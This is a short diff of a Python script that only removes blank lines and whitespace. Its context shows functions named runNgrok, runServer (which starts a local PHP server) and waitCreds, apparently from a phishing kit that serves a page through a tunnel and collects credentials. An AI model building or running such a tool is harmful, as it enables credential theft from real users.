@@ -320,12 +320,7 @@ def runNgrok():
     
 def runServer():
     system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")
-
     
-
-
-
-
 if __name__ == "__main__":
     try:
         runPEnv()
@@ -342,13 +337,7 @@ if __name__ == "__main__":
                     return server()
         server()
         multiprocessing.Process(target=runServer).start()
-        waitCreds()
-
-
-
-
-
-           
+        waitCreds()           
 
     except KeyboardInterrupt: 
         if didBackground:
